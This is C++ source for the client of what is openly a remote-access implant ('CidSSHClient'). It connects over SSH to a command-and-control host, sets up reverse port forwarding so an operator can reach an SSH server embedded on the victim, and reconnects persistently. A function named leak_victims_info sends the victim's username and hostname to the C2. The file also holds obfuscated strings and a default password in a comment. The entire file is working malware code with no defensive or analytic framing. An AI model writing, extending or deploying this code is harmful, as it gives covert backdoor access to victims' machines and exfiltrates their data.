#include <algorithm>
#include <cstdio>
#include <thread>
#include <assert.h>
#include <map>

#include <config.h>

#include <libssh/callbacks.h>
#include <libssh/libssh.h>
#include <libssh/server.h>

#include "CidSSHClient.h"
#include "global.h"
#include "obfuscated_strings.h"
#include "CidSSHServer.h"
#include "C2Connection.h"

#ifdef _WIN32
#	include <Lmcons.h>
#else
#	define UNLEN 256
#	include <arpa/inet.h>
#	include <poll.h>
#	include <pwd.h>
#	include <string.h>
#endif // _WIN32

#define ACCEPT_FORWARD_TIMEOUT 20 // ms

#ifdef PASSWORD_AUTH
char CidSSHClient::password[30] = { 0 };
#endif
pthread_mutex_t CidSSHClient::mutex;
//std::unique_ptr<CidSSHServer> CidSSHClient::cidSSHServer_ = nullptr;

CidSSHClient::CidSSHClient(const std::string C2Host, const int C2Port, const std::string C2User)
    : C2Host_(C2Host)
    , C2Port_(C2Port)
    , C2User_(C2User)
{
    CidSSHClient::cidSSHServer_ = std::make_unique<CidSSHServer>();

#ifdef _WIN32
    InitializeCriticalSection(&mutex);
#else
    pthread_mutex_init(&mutex, nullptr);
#endif // _WIN32

#ifdef PASSWORD_AUTH
    // default password Tf0!rfrfPOs1
    strcat(password, OBFUSCATED(PASSWORD_AUTH));
#endif
}

int CidSSHClient::leak_victims_info(ssh_session session, const int binded_port)
{
    unsigned int type = 0;
#if _WIN32

    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    char username[UNLEN + 1] = { 0 };
#else
    char hostname[HOST_NAME_MAX] = { 0 };
    char username[LOGIN_NAME_MAX] = { 0 };
#endif
    char info[2048] = { 0 };
    ssh_channel channel;
    int rc;
    channel = ssh_channel_new(session);
    if (channel == nullptr)
        return SSH_ERROR;
    rc = ssh_channel_open_session(channel);
    if (rc != SSH_OK)
    {
        ssh_channel_free(channel);
        return rc;
    }

#if _WIN32
    DWORD bufCharCount = UNLEN + 1;
    GetUserName(username, &bufCharCount);
    bufCharCount = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerName(hostname, &bufCharCount);

#else
    gethostname(hostname, sizeof(hostname));
    getlogin_r(username, sizeof(username));
#endif // WIN32

#ifdef CID_WEBSOCKETS
    type = 1;
#else
    type = 0;
#endif // CID_WEBSOCKETS

    snprintf(info, sizeof(info) - 1, "%s$%s$%d$%u", username, hostname, binded_port, type);
    rc = ssh_channel_request_exec(channel, info);
    if (rc != SSH_OK)
    {
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return rc;
    }

    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    return SSH_OK;
}

/* OpenSSH command equivalent:
 * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
 *
 * rport:   port the ssh server will be listening on    // we will do in the C2: ssh localhost -p [rport]
 */
void CidSSHClient::do_remote_forwarding(
    ssh_session sess,
    pthread_mutex_t* mutex,
    std::chrono::time_point<std::chrono::system_clock>* last_keep_alive)
{
    int binded_port = 0;
    std::map<std::thread::id, C2Connection*> active_connections;
    std::unique_ptr<std::thread> serverThread;

#ifdef IS_DEBUG
    int remote_listening_port = 1234;
#else
    int remote_listening_port = 0;
#endif
    auto rc = ssh_channel_listen_forward(sess, OBFUSCATED("127.0.0.1"), remote_listening_port, &binded_port);
    if (rc != SSH_OK)
    {
        debug("[DEBUG] failed: %s\n", ssh_get_error(sess));
        goto clean;
    }

    debug("Check port %d in remote server\n", binded_port ? binded_port : remote_listening_port);
    printf("OK %d\n", binded_port); // Only printed data in Release
    debug("[OTCP] Waiting for incoming connection...\n");

    // Send victims username and hostname to the C2
    if (leak_victims_info(sess, binded_port ? binded_port : remote_listening_port) != SSH_OK)
    {
        debug("Error leaking victim's info\n");
    }

    ssh_channel chan;
    while (!cidSSHServer_->operatorOrderedTermination)
    {
        int dport = 0; // The port bound on the server, here: 8080

        // Check if server sent us a keep alive message recently, if not, restart connection with server
        std::chrono::duration<double> elapsed_seconds =
            std::chrono::system_clock::now() - *last_keep_alive;
        if (elapsed_seconds.count() > 150)
        {
            debug("Didn't get a keep alive message from server. Make sure ClientAliveInterval is "
                "less than 150 seconds\nRestarting connection with server");
            goto clean;
        }

        pthread_mutex_lock(mutex);
        chan = ssh_channel_accept_forward(sess, ACCEPT_FORWARD_TIMEOUT, &dport);
        pthread_mutex_unlock(mutex);

        if (chan == nullptr)
        {
            if (!ssh_is_connected(sess))
            {
                goto clean;
            }

            if (ssh_get_error_code(sess) != 0)
            { /* Timed out */
                //debug("[DEBUG] failed: code: %d msg: %s\n", ssh_get_error_code(sess), ssh_get_error(sess));
                goto clean;
            }
            else
            {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));

                // Check if we need to stop our SSH server because it has no connections
                if (cidSSHServer_->isSSHServerRunning && active_connections.empty())
                {
                    cidSSHServer_->stop();
                    serverThread->join();
                    serverThread.reset();
                    serverThread = nullptr;
                }

                continue;
            }
        }
        debug("\n[OTCP] Connection received\n");

        /* We should check if there is an SSH server running. If not run it*/
        if (!cidSSHServer_->isSSHServerRunning)
        {
            serverThread = std::make_unique<std::thread>(&CidSSHServer::run, cidSSHServer_.get());           
            while (cidSSHServer_->listeningPort == 0 && !cidSSHServer_->isSSHServerRunning)
            {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
        }

        auto conn = new C2Connection(sess,
            chan,
            cidSSHServer_->listeningPort,
            mutex,
            last_keep_alive,
            &cidSSHServer_->operatorOrderedTermination,
            &active_connections);

        std::thread th(&C2Connection::remote_forwading_thread, conn);

        pthread_mutex_lock(mutex);
        active_connections[th.get_id()] = conn;
        pthread_mutex_unlock(mutex);

        th.detach();
    }
clean:

    if (serverThread && serverThread->joinable()) {
        serverThread->join();
    }

    // We may have to wait for the connection threads to finish (probably not)
    while (!active_connections.empty())
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    if (ssh_is_connected(sess))
        ssh_disconnect(sess);

    if (sess != nullptr)
    {
        ssh_free(sess);
        sess = nullptr;
    }
}

void CidSSHClient::global_requests_cb(ssh_session session, ssh_message message, void* userdata)
{
    auto type = ssh_message_type(message);
    auto subtype = ssh_message_subtype(message);

    std::chrono::time_point<std::chrono::system_clock>* last_keep_alive;
    switch (type)
    {
    case SSH_REQUEST_GLOBAL:
        switch (subtype)
        {
        case SSH_GLOBAL_REQUEST_KEEPALIVE:
            debug("Got a keep alive message from server\n");
            last_keep_alive = (std::chrono::time_point<std::chrono::system_clock>*)userdata;
            *last_keep_alive = std::chrono::system_clock::now();

            // reply to the keep alive or server will close the connection
            ssh_message_global_request_reply_success(message, 0);
            break;
        default:
            break;
        }
    default:
        break;
    }
}

//static int my_poll(ssh_pollfd_t* fds, nfds_t nfds, int timeout) {
//
//    return 0;
//};

int CidSSHClient::run()
{
    ssh_session my_ssh_session;
#ifdef IS_DEBUG
    int verbosity = SSH_LOG_FUNCTIONS;
#else
    int verbosity = SSH_LOG_NOLOG;
#endif // DEBUG

    int rc;
    int ret = 0;
    std::chrono::time_point<std::chrono::system_clock> last_keep_alive;

    // We use this variable to count how many tries have we try to contact the C2 and do an exponential wait
    // Using the formula (the result is miliseconds): 5 ** (retries/2)
    // Waits (seconds): 2, 5, 11, 25, 55, 125, 279, 625
    int retries = 0;

    do
    {
        // Open session and set options
        my_ssh_session = ssh_new();
        if (my_ssh_session == nullptr)
            exit(-1);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, C2Host_.c_str());
        ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &C2Port_);

        struct ssh_callbacks_struct cb = { 0 };
        cb.global_request_function = global_requests_cb;
        cb.userdata = &last_keep_alive;

        ssh_callbacks_init(&cb);
        ssh_set_callbacks(my_ssh_session, &cb);

        // Connect to server
        rc = ssh_connect(my_ssh_session);
        if (rc == SSH_ERROR)
        {
            debug("Error connecting to %s:%hu %s\n",
                C2Host_.c_str(),
                C2Port_,
                ssh_get_error(my_ssh_session));
            retries++;

            // Okay, it failed. Disconnect, so we don't leave sockets lying around...
            ssh_disconnect(my_ssh_session);

            // Clean up after ourselves, especially since we ssh_new() above
            ssh_free(my_ssh_session);

            std::this_thread::sleep_for(
                std::chrono::milliseconds(int(1000 * pow(5, retries / 2.0))));
        }
        else
        {
            retries = 0;
#ifdef PASSWORD_AUTH
            rc = ssh_userauth_password(my_ssh_session, C2User.c_str(), C2Password.c_str());
#else
            rc = ssh_userauth_none(my_ssh_session, C2User_.c_str());
#endif
            if (rc != SSH_AUTH_SUCCESS)
            {
                debug("Error authenticating with ssh server: %s\n", ssh_get_error(my_ssh_session));
                exit(1);
            }

            // Set time to keep track of C2 server down
            last_keep_alive = std::chrono::system_clock::now();

            // Once connected to the C2 lets do remote forwarding
            do_remote_forwarding(my_ssh_session, &CidSSHClient::mutex, &last_keep_alive);
        }

        // When the clients disconnects we try to reconnect it again
    } while (!cidSSHServer_->operatorOrderedTermination);

    pthread_mutex_destroy(&mutex);

    return 0;
}
